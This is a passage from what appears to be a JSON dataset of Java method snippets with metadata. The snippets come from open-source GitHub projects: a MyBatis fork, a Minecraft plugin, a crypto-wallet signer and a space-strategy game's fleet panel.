["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder timeout(Integer timeout) {\n      mappedStatement.timeout = timeout;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56909, "method_name": "statementType", "class_name": "Builder", "params": ["StatementType"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder statementType(StatementType statementType) {\n      mappedStatement.statementType = statementType;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56910, "method_name": "resultSetType", "class_name": "Builder", "params": ["ResultSetType"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultSetType(ResultSetType resultSetType) {\n      mappedStatement.resultSetType = resultSetType == null ? ResultSetType.DEFAULT : resultSetType;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56911, "method_name": "cache", "class_name": "Builder", "params": ["Cache"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder cache(Cache cache) {\n      mappedStatement.cache = cache;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56912, "method_name": "flushCacheRequired", "class_name": "Builder", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder flushCacheRequired(boolean flushCacheRequired) {\n      mappedStatement.flushCacheRequired = flushCacheRequired;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56913, "method_name": "useCache", "class_name": "Builder", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder useCache(boolean useCache) {\n      mappedStatement.useCache = useCache;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56914, "method_name": "resultOrdered", "class_name": "Builder", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultOrdered(boolean resultOrdered) {\n      mappedStatement.resultOrdered = resultOrdered;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56915, "method_name": "keyGenerator", "class_name": "Builder", "params": ["KeyGenerator"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder keyGenerator(KeyGenerator keyGenerator) {\n      mappedStatement.keyGenerator = keyGenerator;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56916, "method_name": "keyProperty", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder keyProperty(String keyProperty) {\n      mappedStatement.keyProperties = delimitedStringToArray(keyProperty);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56917, "method_name": "keyColumn", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder keyColumn(String keyColumn) {\n      mappedStatement.keyColumns = delimitedStringToArray(keyColumn);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56918, "method_name": "databaseId", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder databaseId(String databaseId) {\n      mappedStatement.databaseId = databaseId;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56919, "method_name": "lang", "class_name": "Builder", "params": ["LanguageDriver"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder lang(LanguageDriver driver) {\n      mappedStatement.lang = driver;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56920, "method_name": "resultSets", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultSets(String resultSet) {\n      mappedStatement.resultSets = delimitedStringToArray(resultSet);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56921, "method_name": "resulSets", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resulSets(String resultSet) {\n      mappedStatement.resultSets = delimitedStringToArray(resultSet);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56922, "method_name": "build", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MappedStatement", "snippet": "    public MappedStatement build() {\n      assert mappedStatement.configuration != null;\n      assert mappedStatement.id != null;\n      assert mappedStatement.sqlSource != null;\n      assert mappedStatement.lang != null;\n      mappedStatement.resultMaps = Collections.unmodifiableList(mappedStatement.resultMaps);\n      return mappedStatement;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56923, "method_name": "resolveCacheRef", "class_name": "CacheRefResolver", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Cache", "snippet": "  public Cache resolveCacheRef() {\n    return assistant.useCacheRef(cacheRefNamespace);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/CacheRefResolver.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56924, "method_name": "onEnable", "class_name": "Principal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onEnable() {\n\t\t\n\t\tARQUIVO = newFile(\"argoninc/whitelist_items.cfg\", \"{}\");\n\t\tCONFIG = new Config(ARQUIVO);\n\t\n\t\tif(!CONFIG.has(\"craft\")){\n\t\t\tCONFIG.set(\"craft\", new JSONArray());\n\t\t}\n\t\tif(!CONFIG.has(\"place\")){\n\t\t\tCONFIG.set(\"place\", new JSONArray());\n\t\t}\n\t\tif(!CONFIG.has(\"use\")){\n\t\t\tCONFIG.set(\"use\", new JSONArray());\n\t\t}\n\t\t\n\t\tgetServer().getPluginManager().registerEvents(new ListenerCraft(), this);\n\t\tSystem.out.println(\"***************** ENABLE ******************\");\n\t}", "url": "https://raw.githubusercontent.com/argoninc/Whitelist_Craft_Place/master/src/main/java/com/github/argoninc/Main/Principal.java", "stars": "2", "class_props": {"extends": "JavaPlugin", "implements": null, "modifiers": ["public"]}}, {"id": 56925, "method_name": "onDisable", "class_name": "Principal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onDisable() {\n\t\tSystem.out.println(\"***************** DISABLE ******************\");\n\t}", "url": "https://raw.githubusercontent.com/argoninc/Whitelist_Craft_Place/master/src/main/java/com/github/argoninc/Main/Principal.java", "stars": "2", "class_props": {"extends": "JavaPlugin", "implements": null, "modifiers": ["public"]}}, {"id": 56926, "method_name": "newFile", "class_name": "Principal", "params": ["String", "String"], "throws": null, "modifiers": ["private"], "return_type": "File", "snippet": "\tprivate File newFile(String url, String text) {\n        File file = new File(url);\n        if(!file.getParentFile().exists()) {\n            file.getParentFile().mkdirs();\n        }\n        if(!file.exists()) {\n            try {\n                file.createNewFile();\n\n                if(text!=null) {\n                    FileUtils.write(file, text);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        return file;\n    }", "url": "https://raw.githubusercontent.com/argoninc/Whitelist_Craft_Place/master/src/main/java/com/github/argoninc/Main/Principal.java", "stars": "2", "class_props": {"extends": "JavaPlugin", "implements": null, "modifiers": ["public"]}}, {"id": 56927, "method_name": "putStr", "class_name": "Live", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "IO<Unit>", "snippet": "    public IO<Unit> putStr(String str) {\n      return IO.effect(() -> {\n        java.lang.System.out.print(str);\n        return Unit.of();\n      });\n    }", "url": "https://raw.githubusercontent.com/chris-albert/zio4j/master/src/main/java/io/lbert/Console.java", "stars": "11", "class_props": {"extends": null, "implements": ["Console"], "modifiers": []}}, {"id": 56928, "method_name": "putStrLn", "class_name": "Live", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "IO<Unit>", "snippet": "    public IO<Unit> putStrLn(String str) {\n      return IO.effect(() -> {\n        java.lang.System.out.println(str);\n        return Unit.of();\n      });\n    }", "url": "https://raw.githubusercontent.com/chris-albert/zio4j/master/src/main/java/io/lbert/Console.java", "stars": "11", "class_props": {"extends": null, "implements": ["Console"], "modifiers": []}}, {"id": 56929, "method_name": "getStrLn", "class_name": "Live", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IO<String>", "snippet": "    public IO<String> getStrLn() {\n      return IO.effect(() -> {\n        final BufferedReader reader =\n          new BufferedReader(new InputStreamReader(java.lang.System.in));\n        try {\n          return reader.readLine();\n        } catch (Throwable t) {\n          throw new RuntimeException(t);\n        }\n      });\n    }", "url": "https://raw.githubusercontent.com/chris-albert/zio4j/master/src/main/java/io/lbert/Console.java", "stars": "11", "class_props": {"extends": null, "implements": ["Console"], "modifiers": []}}, {"id": 56930, "method_name": "onAttachedToWindow", "class_name": "Practice05AnimatorSetLayout", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onAttachedToWindow() {\n        super.onAttachedToWindow();\n\n        view = findViewById(R.id.objectAnimatorView);\n        animateBt = (Button) findViewById(R.id.animateBt);\n\n        animateBt.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                view.setTranslationX(-200f);\n\n                ObjectAnimator animator1 = ObjectAnimator.ofFloat(view, \"alpha\", 0, 1);\n                ObjectAnimator animator2 = ObjectAnimator.ofFloat(view, \"translationX\", -200, 200);\n                ObjectAnimator animator3 = ObjectAnimator.ofFloat(view, \"rotation\", 0, 1080);\n                animator3.setDuration(1000);\n\n                AnimatorSet animatorSet = new AnimatorSet();\n                // \u7528 AnimatorSet \u7684\u65b9\u6cd5\u6765\u8ba9\u4e09\u4e2a\u52a8\u753b\u534f\u4f5c\u6267\u884c\n                // \u8981\u6c42 1\uff1a animator1 \u5148\u6267\u884c\uff0canimator2 \u5728 animator1 \u5b8c\u6210\u540e\u7acb\u5373\u5f00\u59cb\n                // \u8981\u6c42 2\uff1a animator2 \u548c animator3 \u540c\u65f6\u5f00\u59cb\n                animatorSet.play(animator1).before(animator2); // \u5148\u6267\u884c 1 \u518d\u6267\u884c 2\n                animatorSet.playTogether(animator2, animator3); // 2 \u548c 3 \u540c\u65f6\u5f00\u59cb\n                animatorSet.start();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson6/Practice05AnimatorSetLayout.java", "stars": "2", "class_props": {"extends": "RelativeLayout", "implements": null, "modifiers": ["public"]}}, {"id": 56931, "method_name": "newThread", "class_name": "ThreadNameFactory", "params": ["Runnable"], "throws": null, "modifiers": ["public"], "return_type": "Thread", "snippet": "    public Thread newThread(Runnable r)\n    {\n        Thread t = new Thread(group, r, namePrefix\n                + threadNumber.getAndIncrement(), 0);\n        //\u8bbe\u7f6e\u7ebf\u7a0b\u662f\u5426\u4e3a\u5b88\u62a4\u8fdb\u7a0b\n        if(daemon) {\n            t.setDaemon(daemon);\n        }else{\n            if (t.isDaemon()) {\n                t.setDaemon(false);\n            }\n            if (t.getPriority() != Thread.NORM_PRIORITY) {\n                t.setPriority(Thread.NORM_PRIORITY);\n            }\n        }\n        return t;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/factory/ThreadNameFactory.java", "stars": "1", "class_props": {"extends": null, "implements": ["ThreadFactory"], "modifiers": ["public"]}}, {"id": 56932, "method_name": "getKey", "class_name": "PhoneCacheItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getKey() {\n        return key;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/PhoneCacheItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56933, "method_name": "setKey", "class_name": "PhoneCacheItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setKey(String key) {\n        this.key = key;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/PhoneCacheItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56934, "method_name": "getLastTimeAccess", "class_name": "PhoneCacheItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getLastTimeAccess() {\n        return lastTimeAccess;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/PhoneCacheItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56935, "method_name": "setLastTimeAccess", "class_name": "PhoneCacheItem", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLastTimeAccess(Date lastTimeAccess) {\n        this.lastTimeAccess = lastTimeAccess;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/PhoneCacheItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56936, "method_name": "getItem", "class_name": "PhoneCacheItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Element", "snippet": "    public Element getItem() {\n        return item;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/PhoneCacheItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56937, "method_name": "setItem", "class_name": "PhoneCacheItem", "params": ["Element"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItem(Element item) {\n        this.item = item;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/PhoneCacheItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56938, "method_name": "toString", "class_name": "PhoneCacheItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        StringBuilder buf = new StringBuilder();\n        buf.append(\"key = \");\n        buf.append(key);\n        buf.append(\"; item = \");\n        buf.append(item);\n        return buf.toString();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/PhoneCacheItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56939, "method_name": "loadResult", "class_name": "ResultLoader", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object loadResult() throws SQLException {\n    List<Object> list = selectList();\n    resultObject = resultExtractor.extractObjectFromList(list, targetType);\n    return resultObject;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoader.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56940, "method_name": "selectList", "class_name": "ResultLoader", "params": [], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "List<E>", "snippet": "  private <E> List<E> selectList() throws SQLException {\n    Executor localExecutor = executor;\n    if (Thread.currentThread().getId() != this.creatorThreadId || localExecutor.isClosed()) {\n      localExecutor = newExecutor();\n    }\n    try {\n      return localExecutor.query(mappedStatement, parameterObject, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER, cacheKey, boundSql);\n    } finally {\n      if (localExecutor != executor) {\n        localExecutor.close(false);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoader.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56941, "method_name": "newExecutor", "class_name": "ResultLoader", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Executor", "snippet": "  private Executor newExecutor() {\n    final Environment environment = configuration.getEnvironment();\n    if (environment == null) {\n      throw new ExecutorException(\"ResultLoader could not load lazily.  Environment was not configured.\");\n    }\n    final DataSource ds = environment.getDataSource();\n    if (ds == null) {\n      throw new ExecutorException(\"ResultLoader could not load lazily.  DataSource was not configured.\");\n    }\n    final TransactionFactory transactionFactory = environment.getTransactionFactory();\n    final Transaction tx = transactionFactory.newTransaction(ds, null, false);\n    return configuration.newExecutor(tx, ExecutorType.SIMPLE);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoader.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56942, "method_name": "wasNull", "class_name": "ResultLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean wasNull() {\n    return resultObject == null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoader.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56943, "method_name": "show", "class_name": "JavaVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void show() {\n        System.out.println(\"\u8fd9\u662fJava\u8bfe\u7a0b\u7684\u89c6\u9891\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/abstractfactory/JavaVideo.java", "stars": "2", "class_props": {"extends": "Video", "implements": null, "modifiers": ["public"]}}, {"id": 56944, "method_name": "getPublicKey", "class_name": "Signer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPublicKey() {\n        return publicKey;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/interfaces/Signer.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56945, "method_name": "sign", "class_name": "Signer", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    public abstract String sign(String hex);\n\n    public static boolean shouldProvidePublicKey(@NonNull String coinCode) {\n        switch (coinCode) {\n            case \"BTC\":\n            case \"XRP\":\n            case \"BCH\":\n            case \"LTC\":\n            case \"DASH\":\n            case \"IOST\":\n            case \"XZC\":\n            case \"DCR\":\n                return true;\n            default:\n                return false;\n        }\n\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/interfaces/Signer.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56946, "method_name": "shouldProvidePublicKey", "class_name": "Signer", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean shouldProvidePublicKey(@NonNull String coinCode) {\n        switch (coinCode) {\n            case \"BTC\":\n            case \"XRP\":\n            case \"BCH\":\n            case \"LTC\":\n            case \"DASH\":\n            case \"IOST\":\n            case \"XZC\":\n            case \"DCR\":\n                return true;\n            default:\n                return false;\n        }\n\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/interfaces/Signer.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56947, "method_name": "selectedDest", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "StarSystem", "snippet": "    private StarSystem selectedDest()         { return (StarSystem) sessionVar(\"FLEETDEPLOY_SELECTED_DEST\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56948, "method_name": "selectedDest", "class_name": "FleetPanel", "params": ["StarSystem"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void selectedDest(StarSystem s)   { sessionVar(\"FLEETDEPLOY_SELECTED_DEST\", s); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56949, "method_name": "tentativeDest", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "StarSystem", "snippet": "    private StarSystem tentativeDest()        { return (StarSystem) sessionVar(\"FLEETDEPLOY_TENTATIVE_DEST\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56950, "method_name": "tentativeDest", "class_name": "FleetPanel", "params": ["StarSystem"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void tentativeDest(StarSystem s)  { sessionVar(\"FLEETDEPLOY_TENTATIVE_DEST\", s); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56951, "method_name": "selectedFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ShipFleet", "snippet": "    private ShipFleet selectedFleet()         {\n        Object obj = sessionVar(\"SELECTED_FLEET\");\n        if (obj instanceof ShipFleet)\n            return (ShipFleet) obj;\n\n        selectedFleet(null);\n        return null;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56952, "method_name": "cancel", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cancel()                            { removeSessionVar(\"ADJUSTED_FLEET\"); clearStackAdjustments(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56953, "method_name": "selectedFleet", "class_name": "FleetPanel", "params": ["ShipFleet"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void selectedFleet(ShipFleet s)         { sessionVar(\"SELECTED_FLEET\", s); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56954, "method_name": "adjustedFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ShipFleet", "snippet": "    private ShipFleet adjustedFleet() {\n        ShipFleet adjFleet = (ShipFleet) sessionVar(\"ADJUSTED_FLEET\");\n        if (adjFleet != null)\n            return adjFleet;\n\n        //log(\"creating adjusted fleet\");\n        adjFleet = newAdjustedFleet();\n        adjustedFleet(adjFleet);\n        if (adjFleet == null)\n            return null;\n        if (tentativeDest() != null)\n            FlightPathSprite.workingPath(adjFleet.pathSpriteTo(tentativeDest()));\n        return adjFleet;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56955, "method_name": "adjustedFleet", "class_name": "FleetPanel", "params": ["ShipFleet"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void  adjustedFleet(ShipFleet fl) {\n        FlightPathSprite.workingPath(null);\n        StarSystem sys = selectedDest();\n        if ((fl != null) && (sys != null))\n            FlightPathSprite.workingPath(fl.pathSpriteTo(sys));\n\n        sessionVar(\"ADJUSTED_FLEET\", fl);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56956, "method_name": "displayedFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ShipFleet", "snippet": "    private ShipFleet displayedFleet()  {\n        ShipFleet fl = (ShipFleet) sessionVar(\"DISPLAYED_FLEET\");\n        fl = parent.shipFleetToDisplay();\n        return (fl == null) ? adjustedFleet() : fl;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56957, "method_name": "displayedFleet", "class_name": "FleetPanel", "params": ["ShipFleet"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void  displayedFleet(ShipFleet s)       { sessionVar(\"DISPLAYED_FLEET\", s); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56958, "method_name": "handleNextTurn", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNextTurn() {  clearStackAdjustments(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56959, "method_name": "fleetToDisplay", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ShipFleet", "snippet": "    public ShipFleet fleetToDisplay() {\n        return parent.shipFleetToDisplay();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56960, "method_name": "hoverOverFleets", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hoverOverFleets()               { return (selectedFleet() == null) || (selectedFleet().empire() != player()); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56961, "method_name": "hoverOverFlightPaths", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hoverOverFlightPaths()          { return selectedFleet() == null; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56962, "method_name": "displayedDestination", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StarSystem", "snippet": "    public StarSystem displayedDestination() {\n        if (tentativeDest() != null)\n            return tentativeDest();\n        else if (selectedDest() != null)\n            return selectedDest();\n        else\n            return null;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56963, "method_name": "clearStackAdjustments", "class_name": 